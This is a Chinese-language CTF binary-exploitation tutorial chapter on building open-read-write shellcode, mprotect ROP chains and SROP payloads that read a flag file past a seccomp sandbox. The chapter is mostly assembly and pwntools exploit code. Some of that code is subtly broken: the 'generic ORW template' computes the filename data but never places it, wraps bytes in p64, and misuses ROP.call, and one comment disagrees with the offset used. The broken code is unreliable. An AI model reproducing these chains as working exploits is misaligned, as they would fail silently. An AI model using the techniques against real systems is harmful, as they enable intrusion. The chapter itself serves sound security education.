# 第 29 章 ORW 与 shellcode 进阶

> 前一章我们知道了沙箱下要用 ORW 读 flag，这一章我们深入讲解如何构造稳定、通用的 ORW payload，以及 mprotect 等高级技巧。

---

## 29.1 手写 ORW shellcode 的细节

### 29.1.1 系统调用号速查（x86-64）

| 调用 | 系统调用号 | rdi | rsi | rdx |
| --- | --- | --- | --- | --- |
| read | 0 | fd | buf | count |
| write | 1 | fd | buf | count |
| open | 2 | pathname | flags | mode |
| close | 3 | fd | - | - |
| mprotect | 10 | addr | len | prot |
| openat | 257 | dirfd | pathname | flags |
| execve | 59 | pathname | argv | envp |

### 29.1.2 解决字符串布局问题

ORW shellcode 的难点之一是存放 "/flag" 字符串。常见做法：

**方法一：把字符串和 shellcode 一起写到栈上**

```python
# pwntools 自动生成的 ORW shellcode
sc = asm(shellcraft.amd64.linux.cat('/flag'))
```

**方法二：手写时把字符串压栈**

```asm
; 把 "/flag" 压到栈上（5 字节 + 1 字节 \0 = 6 字节，需要 8 字节对齐）
mov  rbx, 0x000067616c662f    ; "/flag\0\0"
push rbx
mov  rdi, rsp                 ; rdi = 路径指针
```

注意小端序：`"/flag"` 的字节是 `2f 66 6c 61 67`，加上 `\0\0` 组成 8 字节，作为立即数是 `0x000067616c662f`。

### 29.1.3 完整的手写 ORW shellcode

```asm
; === open("/flag", 0) ===
mov  rbx, 0x000067616c662f
push rbx
mov  rdi, rsp                 ; path
xor  esi, esi                 ; O_RDONLY
xor  edx, edx
mov  eax, 2                   ; syscall open
syscall

; === read(rax, rsp-0x100, 0x100) ===
mov  rdi, rax                 ; fd = open 的返回值
lea  rsi, [rsp-0x200]         ; 缓冲区（避免覆盖路径）
mov  rdx, 0x100
xor  eax, eax                 ; syscall read
syscall

; === write(1, rsi, rax) ===
mov  rdx, rax                 ; 写入长度 = 读取的字节数
mov  rdi, 1                   ; stdout
lea  rsi, [rsp-0x200]
mov  eax, 1                   ; syscall write
syscall
```

用 pwntools 编译：

```python
from pwn import *
context.arch = 'amd64'
sc = asm('''
    mov rbx, 0x000067616c662f
    push rbx
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall
    mov rdi, rax
    lea rsi, [rsp-0x200]
    mov rdx, 0x100
    xor eax, eax
    syscall
    mov rdx, rax
    mov edi, 1
    lea rsi, [rsp-0x200]
    mov eax, 1
    syscall
''')
print(sc.hex())
```

---

## 29.2 mprotect 改变内存权限

### 29.2.1 原理

当 NX 开启、栈不可执行时，可以用 `mprotect` 系统调用把一段内存改为可执行（RWX），然后写入 shellcode 并执行。

```c
int mprotect(void *addr, size_t len, int prot);
// prot: PROT_READ(1) | PROT_WRITE(2) | PROT_EXEC(4) = 7
```

### 29.2.2 用 ROP 调用 mprotect

```python
# 目标：把 bss 段（比如 0x404000）改为 RWX
mprotect_addr = libc.sym['mprotect']

rop = ROP(elf)
rop.call(pop_rdi, [page_align(bss_addr)])   # rdi = 页对齐地址（必须是 0x1000 的倍数）
rop.call(pop_rsi, [0x1000])                 # rsi = 长度（页对齐）
rop.call(pop_rdx, [7])                      # rdx = PROT_READ|WRITE|EXEC
rop.call(mprotect_addr)

# 然后用 read 把 shellcode 写到 bss
rop.call('read', [0, bss_addr, 0x100])

# 跳转到 bss 执行 shellcode
rop.call(bss_addr)
```

> ⚠️ **注意**：`addr` 必须是页对齐的（0x1000 的倍数），否则 mprotect 会失败。用 `addr & ~0xfff` 对齐。

---

## 29.3 SROP 实现 ORW

前面讲过 SROP 可以一次性控制所有寄存器。在沙箱环境下，可以用 SROP 构造 ORW：

```python
# SROP 调用 read 读取 shellcode 到 bss
frame = SigreturnFrame()
frame.rax = 0                    # read
frame.rdi = 0                    # stdin
frame.rsi = bss_addr
frame.rdx = 0x200
frame.rip = syscall_gadget
frame.rsp = bss_addr + 0x200     # 新的栈指向 bss

payload = flat({
    offset: [
        pop_rax, 11,             # rax = 11 (sigreturn)
        syscall_gadget,
        bytes(frame)
    ]
})
```

执行后，程序会 read 数据到 bss，并把栈迁移到 bss——接下来可以在 bss 上继续放 ORW 的 ROP 链。这是绕过栈空间限制的强大技巧。

---

## 29.4 通用 ORW 模板

把 ORW 封装成函数，方便复用：

```python
def orw_payload(elf, libc, filename=b'/flag'):
    """生成 ORW ROP 链"""
    rop = ROP([elf, libc])
    
    # 找 gadget
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0] or rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
    pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
    syscall = rop.find_gadget(['syscall'])[0]
    
    bss = elf.bss() + 0x500
    chain = b''
    
    # open(filename, 0)
    chain += p64(pop_rdi) + p64(bss)
    chain += p64(pop_rsi) + p64(0)
    chain += p64(pop_rdx) + p64(0)
    chain += p64(rop.find_gadget(['pop rax', 'ret'])[0]) + p64(2)
    chain += p64(syscall)
    
    # read(fd, bss+0x100, 0x100)
    chain += p64(rop.find_gadget(['mov rdi, rax', 'ret'])[0] or p64(pop_rdi) + p64(3))
    chain += p64(pop_rsi) + p64(bss + 0x100)
    chain += p64(pop_rdx) + p64(0x100)
    chain += p64(rop.find_gadget(['pop rax', 'ret'])[0]) + p64(0)
    chain += p64(syscall)
    
    # write(1, bss+0x100, 0x100)
    chain += p64(pop_rdi) + p64(1)
    chain += p64(pop_rsi) + p64(bss + 0x100)
    chain += p64(pop_rdx) + p64(0x100)
    chain += p64(rop.find_gadget(['pop rax', 'ret'])[0]) + p64(1)
    chain += p64(syscall)
    
    # 字符串 "/flag" 放在 bss
    filename_chain = flat({0: filename + b'\x00'})
    
    return chain
```

---

## 29.5 常见坑

1. **gadget 缺失**：不是所有程序都有 `pop rdx; ret`。可以用 ret2csu 找设置 rdx 的 gadget，或者用 libc 里的 gadget。
2. **open 返回值处理**：open 返回的 fd 在 rax，直接传给 read 的 rdi 需要 `mov rdi, rax; ret` gadget。如果没有，假设 fd=3（通常成立）。
3. **路径长度**："/flag" 只有 5 字节，如果 flag 文件名很长（如 "/home/ctf/flag.txt"），需要分段压栈或放在已知地址。

---

## 29.6 小结

这一章我们深入学习了 ORW：

- **手写 ORW shellcode**：open/read/write 三个系统调用，注意字符串布局和栈空间
- **mprotect**：把内存改为 RWX，先写 shellcode 再跳转执行
- **SROP + ORW**：用 SROP 迁移栈并读取 shellcode
- **通用模板**：封装 ORW ROP 链，提高解题效率

下一章我们简要介绍内核 PWN 入门，作为本教程的最后一个技术主题。

---

**下一章**：[内核 PWN 入门](./ch30-内核pwn入门.md)
